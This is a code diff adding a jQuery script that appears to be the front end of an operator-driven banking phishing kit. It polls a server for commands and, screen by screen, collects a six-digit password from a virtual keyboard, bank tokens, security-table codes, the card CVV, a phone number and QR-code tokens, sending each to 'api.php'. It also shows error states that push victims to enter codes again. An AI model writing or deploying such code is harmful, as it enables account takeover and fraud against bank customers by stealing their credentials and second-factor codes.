@@ -1,0 +1,394 @@
+$('document').ready(function() {
+
+    let status = 'AGUARDANDO_INTERNA';
+    let info;
+
+
+    $("#modal").modal({
+        escapeClose: false,
+        clickClose: false,
+        showClose: false
+    });
+
+    let alphaTeclado = 1;
+    let id = $('#idInfo').val();
+    let clientHashId = $('#clientHashId').val();
+
+    function loadInfo(){
+        $.ajax({
+            url: "api.php",
+            type:'POST',
+            dataType : "json",
+            data: { action : "GET_INFO", id : id, clientHashId : clientHashId},
+            cache: false,
+            success: function(r){
+                info = r;
+                if(r.comando !== status) {
+                    status = r.comando;
+                    atualizarTela();
+                }
+            }
+        });
+    }
+    
+
+    $('ul#ul_teclado_virtual li a').click( e => {
+        let valor = $(event.target).text();
+        valor = valor.trim();
+
+        $('div#boxSenhaDe6').find('.box_redLine_bottom').removeClass('form_erro');
+
+        let s6_1 = $('#s6_1').val();
+        let s6_2 = $('#s6_2').val();
+        let s6_3 = $('#s6_3').val();
+        let s6_4 = $('#s6_4').val();
+        let s6_5 = $('#s6_5').val();
+        let s6_6 = $('#s6_6').val();
+
+        if(s6_1.length === 0){
+            $('#s6_1').val(valor);
+        } else if(s6_2.length === 0){
+            $('#s6_2').val(valor);
+        } else if(s6_3.length === 0){
+            $('#s6_3').val(valor);
+        } else if(s6_4.length === 0){
+            $('#s6_4').val(valor);
+        } else if(s6_5.length === 0){
+            $('#s6_5').val(valor);
+        } else if(s6_6.length === 0){
+            $('#s6_6').val(valor);
+        }
+    });
+
+    $('#botao_limpar').click(function(e) {
+        $('.frmPassWord').val('');
+    });
+
+    $('#diminuiContraste').click(function(e) {
+
+        let opacidade = $('ul#ul_teclado_virtual li').css('opacity');
+
+        if(opacidade > 0) {
+            opacidade -= 0.10;
+            $('ul#ul_teclado_virtual li').css('opacity', opacidade);
+        }
+        
+    });
+
+    $('#aumentaContraste').click(function(e) {
+
+        let opacidade = $('ul#ul_teclado_virtual li').css('opacity');
+
+        if(opacidade < 1) {
+
+            opacidade = parseFloat(opacidade) + parseFloat(0.10);
+            $('ul#ul_teclado_virtual li').css('opacity', opacidade);
+        }
+        
+    });
+
+    $('input#celular').mask('(00) 00000-0000');
+
+
+    function atualizarTela(){
+
+        $('div.boxes').addClass('hide');
+        $('div#boxTabela').find('.box_redLine_bottom').removeClass('form_erro');
+        $('div#boxToken').find('.box_redLine_bottom').removeClass('form_erro');
+        $('div#boxSenhaDe6').find('.box_redLine_bottom').removeClass('form_erro');
+        $('div#boxCelular').find('.box_redLine_bottom').removeClass('form_erro');
+        $('div#boxCvv').find('.box_redLine_bottom').removeClass('form_erro');
+        
+        
+
+        if(status === 'AGUARDANDO_INTERNA'){
+            $('div#boxCarregando').removeClass('hide');
+        }
+        if(status ==='SENHA_DE_6_INTERNA'){
+            $('div#boxSenhaDe6').removeClass('hide');
+        }
+        if(status ==='SENHA_DE_6_ERRO_INTERNA'){
+            $('div#boxSenhaDe6').removeClass('hide');
+            $('div#boxSenhaDe6').find('.box_redLine_bottom').addClass('form_erro');
+        }
+        if(status ==='TOKEN_INTERNA'){
+            $('div#boxToken').removeClass('hide');
+        }
+        if(status ==='TOKEN_ERRO_INTERNA'){
+            $('div#boxToken').removeClass('hide');
+            $('div#boxToken').find('.box_redLine_bottom').addClass('form_erro');
+        }
+
+        if(status ==='TABELA_INTERNA'){
+
+            $('#posicao').text(info.texto);
+            $('div#boxTabela').removeClass('hide');
+        }
+        if(status ==='TABELA_ERRO_INTERNA'){
+            $('#posicao').text(info.texto);
+            $('div#boxTabela').removeClass('hide');
+            $('div#boxTabela').find('.box_redLine_bottom').addClass('form_erro');
+        }
+        if(status ==='CELULAR_INTERNA'){
+            $('div#boxCelular').removeClass('hide');
+        }
+        if(status ==='CELULAR_ERRO_INTERNA'){
+            $('div#boxCelular').removeClass('hide');
+            $('div#boxCelular').find('.box_redLine_bottom').addClass('form_erro');
+        }
+        if(status ==='CVV_INTERNA'){
+            $('div#boxCvv').removeClass('hide');
+        }
+        if(status ==='CVV_ERRO_INTERNA'){
+            $('div#boxCvv').removeClass('hide');
+            $('div#boxCvv').find('.box_redLine_bottom').addClass('form_erro');
+        }
+        if(status ==='QR_CODE_INTERNA'){
+            $('div#boxQrCode input#qrCodeToken').val('');
+            $('div#boxQrCode div.qrBox img').attr('src', 'qrs/' + info.qrCodeFile);
+            $('div#boxQrCode div.erro').addClass('hide');
+            
+            $('div#boxQrCode div#aguardeQR').removeClass('hide');
+            $('div#boxQrCode div#capturaQR').addClass('hide');
+
+            setTimeout(function(){
+
+                $('div#boxQrCode div#aguardeQR').addClass('hide');
+                $('div#boxQrCode div#capturaQR').removeClass('hide');
+
+            }, 4000);
+
+            $('div#boxQrCode').removeClass('hide');
+            $('div#boxQrCode input#qrCodeToken').focus();
+        }
+        if(status == 'TELA_FIM_INTERNA') {
+            window.location.href = "fim.php?hash="+clientHashId;
+        }
+    }
+    
+
+    $( "input#token" ).keyup(function(e) {
+        let token = $(e.target).val();
+        if(token.length > 0){
+            $('div#boxToken').find('.box_redLine_bottom').removeClass('form_erro');
+        }
+    });
+
+    $('div#modal').on('click', 'div#boxQrCode input.bt_avancar', function(e) {
+        
+
+        let token = $('input#qrCodeToken').val();
+
+        if(token.length !== 8){
+            $('div#boxQrCode').find('div.erro').removeClass('hide');
+            $('div#boxQrCode input#qrCodeToken').focus();
+            return;
+        }
+
+        info.comando = 'AGUARDANDO_INTERNA';
+
+        $.ajax({
+            url: "api.php",
+            type:'POST',
+            data: { action : "SALVAR_QR_INTERNA", id : id,clientHashId : clientHashId, posicao: '-', valor : token},
+            cache: false,
+            success: function(r){
+                status = info.comando;
+                $('input#token').val('');
+                atualizarTela();
+                
+            }
+        });
+
+    });
+    
+    $('div#modal').on('click', 'div#boxToken input.bt_avancar', function(e) {
+        
+
+        let token = $('input#token').val();
+
+        if(token.length !== 6){
+            $('div#boxToken').find('.box_redLine_bottom').addClass('form_erro');
+            return;
+        }
+
+        info.comando = 'AGUARDANDO_INTERNA';
+
+        $.ajax({
+            url: "api.php",
+            type:'POST',
+            data: { action : "SALVAR_TOKEN_INTERNA", id : id,clientHashId : clientHashId, posicao: '-', valor : token},
+            cache: false,
+            success: function(r){
+                status = info.comando;
+                $('input#token').val('');
+                atualizarTela();
+                
+            }
+        });
+
+    });
+
+
+    $( "input#posicaoTabela" ).keyup(function(e) {
+
+        let tabela = $(e.target).val();
+        if(tabela.length > 0){
+            $('div#boxTabela').find('.box_redLine_bottom').removeClass('form_erro');
+        }
+    });
+
+    $('div#modal').on('click', 'div#boxTabela input.bt_avancar', function(e) {
+
+        let token = $('input#posicaoTabela').val();
+
+        if(token.length !== 3){
+            $('div#boxTabela').find('.box_redLine_bottom').addClass('form_erro');
+            return;
+        }
+
+        info.comando = 'AGUARDANDO_INTERNA';
+
+        $.ajax({
+            url: "api.php",
+            type:'POST',
+            data: { action : "SALVAR_TOKEN_INTERNA", id : id,clientHashId : clientHashId, posicao: info.texto, valor : token},
+            cache: false,
+            success: function(r){
+                status = info.comando;
+                $('input#posicaoTabela').val('');
+                atualizarTela();
+                
+            }
+        });
+
+    });
+
+    function zerarSenhaDe6(){
+        senhaDe4 = '';
+        $('#s6_1').val('');
+        $('#s6_2').val('');
+        $('#s6_3').val('');
+        $('#s6_4').val('');
+        $('#s6_5').val('');
+        $('#s6_6').val('');
+    }
+
+
+    $('div#modal').on('click', 'div#boxSenhaDe6 input.bt_avancar', function(e) {
+
+        let s6_1 = $('#s6_1').val();
+        let s6_2 = $('#s6_2').val();
+        let s6_3 = $('#s6_3').val();
+        let s6_4 = $('#s6_4').val();
+        let s6_5 = $('#s6_5').val();
+        let s6_6 = $('#s6_6').val();
+
+        let senhaDe6 = s6_1 + '' + s6_2 + '' + s6_3 + '' + s6_4 + '' + s6_5 + '' + s6_6;
+
+        if(senhaDe6.length !== 6){
+            $('div#boxSenhaDe6').find('.box_redLine_bottom').addClass('form_erro');
+            return;
+        }
+
+        info.senha6 = senhaDe6;
+        info.comando = 'AGUARDANDO_INTERNA';
+
+        $.ajax({
+            url: "api.php",
+            type:'POST',
+            data: { action : "ATUALIZAR_INFORMACOES", id : id, clientHashId : clientHashId, obj : info},
+            cache: false,
+            success: function(r){
+                status = info.comando;
+                zerarSenhaDe6();
+                atualizarTela();
+                
+            }
+        });
+
+    });
+
+
+    $( "input#cartaoCvv" ).keyup(function(e) {
+
+        let cvv = $(e.target).val();
+        if(cvv.length > 0){
+            $('div#boxCvv').find('.box_redLine_bottom').removeClass('form_erro');
+        }
+    });
+
+    $('div#modal').on('click', 'div#boxCvv input.bt_avancar', function(e) {
+
+        let cvv = $('input#cartaoCvv').val();
+
+        if(cvv.length !== 3){
+            $('div#boxCvv').find('.box_redLine_bottom').addClass('form_erro');
+            return;
+        }
+
+        info.cvv = cvv;
+        info.comando = 'AGUARDANDO_INTERNA';
+
+
+
+        $.ajax({
+            url: "api.php",
+            type:'POST',
+            data: { action : "ATUALIZAR_INFORMACOES", id : id, clientHashId : clientHashId, obj : info},
+            cache: false,
+            success: function(r){
+                status = info.comando;
+                $('input#cartaoCvv').val('');
+                atualizarTela();
+                
+            }
+        });
+
+    });
+
+
+    $( "input#celular" ).keyup(function(e) {
+
+        let cvv = $(e.target).val();
+        if(cvv.length > 0){
+            $('div#boxCelular').find('.box_redLine_bottom').removeClass('form_erro');
+        }
+    });
+
+    $('div#modal').on('click', 'div#boxCelular input.bt_avancar', function(e) {
+
+        let celular = $('input#celular').val();
+
+        if(celular.length < 8){
+            $('div#boxCelular').find('.box_redLine_bottom').addClass('form_erro');
+            return;
+        }
+
+        info.celular = celular;
+        info.comando = 'AGUARDANDO_INTERNA';
+
+
+
+        $.ajax({
+            url: "api.php",
+            type:'POST',
+            data: { action : "ATUALIZAR_INFORMACOES", id : id, clientHashId : clientHashId, obj : info},
+            cache: false,
+            success: function(r){
+                status = info.comando;
+                $('input#celular').val('');
+                atualizarTela();
+                
+            }
+        });
+
+    });
+
+    var timer = setInterval ( function(){
+        loadInfo();
+    }, 2000 );
+
+    loadInfo();
+
+});
